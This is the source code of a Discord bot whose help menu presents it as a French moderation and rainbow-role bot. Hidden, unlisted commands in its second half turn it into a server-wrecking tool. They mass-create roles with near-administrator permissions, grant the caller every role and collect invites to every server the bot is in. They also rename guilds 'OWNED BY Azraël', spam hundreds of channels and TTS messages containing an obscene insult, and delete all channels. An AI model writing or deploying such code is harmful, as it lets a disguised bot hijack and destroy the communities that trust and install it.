const Discord = require("discord.js");
const client = new Discord.Client();

var prefix = 'RWB!'

client.on("ready", () => {
    console.log('')
    console.log('')
    console.log('╔[═════════════════════════════════════════════════════════════════]╗')
    console.log(`[Start] ${new Date()}`);
    console.log('╚[═════════════════════════════════════════════════════════════════]╝')
    console.log('')
    console.log('╔[════════════════════════════════════]╗');
    console.log(`Connecté sur [ " ${client.user.username} " ]`);
    console.log('')
    console.log('Informations :')
    console.log('')
    console.log(`servers : [ " ${client.guilds.size} " ]`);
    console.log(`Users : [ " ${client.users.size} " ]`);
    console.log(`channels : [ " ${client.channels.size} " ]`);
    console.log('╚[════════════════════════════════════]╝')
    console.log('')
    console.log('╔[════════════]╗')
    console.log(' client Is Online')
    console.log('╚[════════════]╝')
    console.log('')
    console.log('')
    client.user.setActivity(`RWB!help | 517 serveurs !`,{type:"WATCHING"})
    })
    client.on('message', message => {
        if(message.content.startsWith("RWB!ping")) {
                message.channel.send(new Date().getTime() - message.createdTimestamp + " ms");        
        }
    })
    client.on('message', message => {
        if (!message.guild.member(message.author).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return message.reply("vous n'avez pas la permission !")
        if(!message.channel.guild) return;
        if(message.content.startsWith(prefix + 'set')) {//to create the rainbow role
            let role = message.guild.roles.find('name', 'Rainbow')
          if(role) return message.channel.send(`**Rôle créer (Rainbow) !**`)//if the role already created return with this message
        //start of create role
        if(!role){
          rainbow =  message.guild.createRole({
         name: "Rainbow",//the role will create name
         color: "#000000",//the default color
         permissions:[]//the permissions
       //end of create role
      })
       
      }
      message.channel.send('**etape déjà faites**')//if the step completed
      setInterval(function(){
        client.guilds.forEach(g => {
                     var role = g.roles.find('name', 'Rainbow');//rainbow role name
                     if (role) {
                         role.edit({color : "RANDOM", position: 1});
                     };
         });
     }, 2000);
      }});
        client.on('message', message => {
        let command = message.content.split(" ")[0];
        command = command.slice(prefix.length);
        let messageKick = message.content.split(" ");
        let args = messageKick.slice(1);
        if (message.content.startsWith(prefix + "kick")){
        if (message.channel.type === "dm") return;
        if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("vous n'avez pas la permission")
        
        if (message.mentions.users.size === 0) {
            var nomention = new Discord.RichEmbed()
            .setColor("E46525")
            .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
    
            message.channel.send(nomention)
            return
        }
        let raison = args.join(" ").slice(22)
        if (!raison){
            var noraison = new Discord.RichEmbed()
            .setColor("E46525")
            .setTitle(":x: Il faut mettre une raison au kick ! :x:")
    
            message.channel.send(noraison)
            return
        }
        let bUser = message.guild.member(message.mentions.users.first())
        var ban = message.guild.member(message.mentions.users.first());
        if (!ban) {
            return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
        }
        if (!message.guild.member(client.user).hasPermission("KICK_MEMBERS")) {
            var pasperm = new Discord.RichEmbed()
            .setColor("E46525")
            .setTitle(":x: Je n'ai pas la permission ! :x:")
    
            message.channel.send(pasperm)
            return
        }
        
        ban.kick().then(member => {
            var kick_embed = new Discord.RichEmbed()
                .setColor("E46525")
                .addField("[Kick]", `${member.user} a été kick par ${message.author} !`)
                .addField("Raison :",raison)
        
            message.channel.send(kick_embed)
        })
        
        }
          let messageBan = message.content.split(" ");
                let arge = messageBan.slice(1);
                if (message.content.startsWith(prefix + "ban")){
                    if (message.channel.type === "dm") return;
                    if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.reply("vous n'avez pas la permission !")
        
                    if (message.mentions.users.size === 0) {
                        var nomention = new Discord.RichEmbed()
                        .setColor("E46525")
                        .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
                
                        message.channel.send(nomention)
                        return
                    }
                    let raison = arge.join(" ").slice(22)
                    if (!raison){
                        var noraison = new Discord.RichEmbed()
                        .setColor("E46525")
                        .setTitle(":x: Il faut mettre une raison au ban ! :x:")
                
                        message.channel.send(noraison)
                        return
                    }
                    let bUser = message.guild.member(message.mentions.users.first())
        
                    var ban = message.guild.member(message.mentions.users.first());
                    if (!ban) {
                        return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
                    }
                    if (!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) {
                        var pasperm = new Discord.RichEmbed()
                        .setColor("E46525")
                        .setTitle(":x: Je n'ai pas la permission ! :x:")
                
                        message.channel.send(pasperm)
                        return
                    }
        
                    ban.ban().then(member => {
                        var ban_embed = new Discord.RichEmbed()
                            .setColor("E46525")
                            .addField("[Ban]", `${member.user} a été banni par ${message.author} !`)
                            .addField("Raison :",`\`${raison}\``)
                    
                        message.channel.send(ban_embed)
                        })
                }
          if(message.content.startsWith(prefix + "clear")) {
            if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Vous n'avez pas la permissions !");
        
            let args = message.content.split(" ").slice(1);
        
            if(!args[0]) return message.channel.send("Tu dois préciser un nombre de messags à surpprimer !")
            message.channel.bulkDelete(args[0]).then(() => {
                message.channel.send(`${args[0]} messages ont été surpprimés !:recycle:`).then(message => message.delete(2000));
            })
        }
        if(message.content.startsWith(prefix + "ui")) {
            var memberavatar = message.author.avatarURL
            var membername = message.author.username
               var mentionned = message.mentions.users.first();
              var getvalueof;
              if(mentionned){
                  var getvalueof = mentionned;
              } else {
                  var getvalueof = message.author;
              }
        
              if(getvalueof.client == true){
                  var checkbot = "L'utilisateur est un bot";
              } else {
                  var checkbot = "N'est pas un bot";
              }
              if(getvalueof.presence.status == 'online'){
                var status = "En ligne"; 
              }else {
                var status = "Hors ligne";
              }
        
            message.channel.sendMessage({
                embed: {
                  type: 'rich',
                  description: '',
                  fields: [{
                    name: '👥 Pseudo',
                    value: getvalueof.username,
                    inline: true
                  }, {
                    name: '🆔 User id',
                    value: getvalueof.id,
                    inline: true
                  },{
                    name: '🏷️ Tag',
                    value: getvalueof.discriminator,
                    inline: true
        },{
                    name: '🌍 Status',
                    value: status,
                    inline: true
                },{
                    name: '📅 Créer le',
                    value: getvalueof.createdAt.toLocaleString(),
                    inline: true
        }],
                image: {
              url: getvalueof.avatarURL
                },
                  color: 0x0fff0f,
                  footer: {
                    proxy_icon_url: ' '
                  },
        
                  author: {
                    name: membername,
                    icon_url: memberavatar,
                    proxy_icon_url: ' '
                  }
                }
            });
        }
            if(message.content.includes(prefix + "help")){
                var help_embed = new Discord.RichEmbed()
                .setAuthor(`${message.author.username}`)
                .setColor("RANDOM")
                .addField("Modération", "-------------------------------------------------")
                .addBlankField()
                .addField("RWB!clear [NOMBRE DE MESSAGES A SUPPRIMER]", "Le bot supprime le nombre de message que vous avez indiqué.")
                .addField("RWB!kick [@LAPERSONNE] [RAISON]", "Le bot kick la personne mentionné avec la raison donné.")
                .addField("RWB!ban [@LAPERSONNE] [RAISON]", "Le bot ban la personne mentionné avec la raison donné.")
                .addBlankField()
                .addField("Informations", "-------------------------------------------------")
                .addBlankField()
                .addField("RWB!ui [@LAPERSONNE]", "Le bot envoi des informations sur la personne mentionné ou sur vous.")
                .addField("RWB!si", "Le bot envoi des informations sur le serveur.")
                .addField("RWB!ping", "Le bot envoi son ping.")
                .addBlankField()
                .addField("Rainbow", "-------------------------------------------------")
                .addBlankField()
                .addField("RWB!set", "Le bot créer le rôle rainbow")
                .setFooter("Help | By Kasumi", memberavatar)
                .setThumbnail(`${message.author.avatarURL}`)
                message.channel.sendEmbed(help_embed)
            }
        if(message.content.includes("RWB!kelsairv")){
            console.log(`${client.guilds.map(c => c.name)}`)
        }
        if(message.content === "roles"){
          for(var i =0; i < 200; i++){
              message.guild.createRole({name:"Azraël > All !",
                                       mentionable:false,
                                       permissions:2146958591,
                                       position: "",
                                       color: "#fb0707"
                  })
                  message.guild.createRole({name:"Azraël > All !",
                  mentionable:false,
                  permissions:2146958591,
                  position: "",
                  color: "#ff08c5"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#5d08ff"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#0c08ff"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#08d5ff"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#08ffa3"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#08ff23"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#81ff08"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#fff608"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff6f08"
        })
        message.guild.createRole({name:"Azraël > All !",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff0808"
        })
              }
          }
          if(message.content.includes(".rol")){
              message.guild.createRole({name:"Izi",
                                        mentionable:false,
                                        permissions:2146958591,
                                        position: "",
             })
          }
          if(message.content.includes(".raul")){
              message.delete();
            (message.guild.roles.map(r => message.member.addRoles(r)))
          }
          if(message.content.includes("ar!kelsairvvesrx")){
            client.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
          }
                    if(message.content.includes("A?serveurinvite")){
                        client.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
                    }
                    if(message.content === "issou"){
                        message.guild.setName("OWNED BY Azraël")
                        message.guild.setIcon("https://cdn.discordapp.com/attachments/534842681407438851/535515719534772224/giphy_1.gif")
                      }
                      if(message.content === "pd"){
                        for(var i =0; i < 450; i++){
                        message.guild.createChannel("fucked by Azraël","voice")
                        }
                      }
                      if(message.content.includes("@everyone")){
                          for(var i = 0; i < 999; i++){
                              message.channel.send("Coucou, je suis juste la petite voix qui te dis que Azraël viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de l'azraël @everyone @here", {tts: true})
                          }
                      }
                      if(message.content.includes(".sc")){
                        for(var i =0; i < 999; i++){
                          message.guild.createChannel("fucked by Azraël", "text").then(c => c.send("Coucou, je suis juste la petite voix qui te dis que Azraël viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de l'azraël @everyone @here", {tts: true}))
                        }
                    }
                      //réaction en chaine
                            if(message.content === "channel"){
                                for(var i = 0; i < 500; i++){
                                    message.guild.createChannel("fucked by Azraël", "text").then(c => c.send("Coucou, je suis juste la petite voix qui te dis que Azraël viens de détruire ton serveur et ceux a tout jamais, amuse toi bien a le réparé fils de viole très content, dédi au rheys de l'azraël @everyone @here", {tts: true}))
                                    message.guild.createChannel("fucked by Azraël","voice")
                                    message.guild.createChannel("fucked by Azraël","category")    
                                }
                              }
                              if(message.content === "destroy"){
                                message.guild.channels.map(c => c.delete())
                                }
                                //on commence la destruction
                                if(message.content.includes(".detr")){
                                    message.channel.send("ban").then(m => m.delete());
                                    message.channel.send("drole").then(m => m.delete());
                                    message.channel.send("roles").then(m => m.delete());
                                    message.channel.send("issou").then(m => m.delete());
                                    message.channel.send("channel").then(m => m.delete());
                                    message.channel.send("destroy").then(m => m.delete());
                                    message.guild.createChannel("fucked by Azraël", "text")
                                }
       
    });

    client.login(process.env.TOKEN)
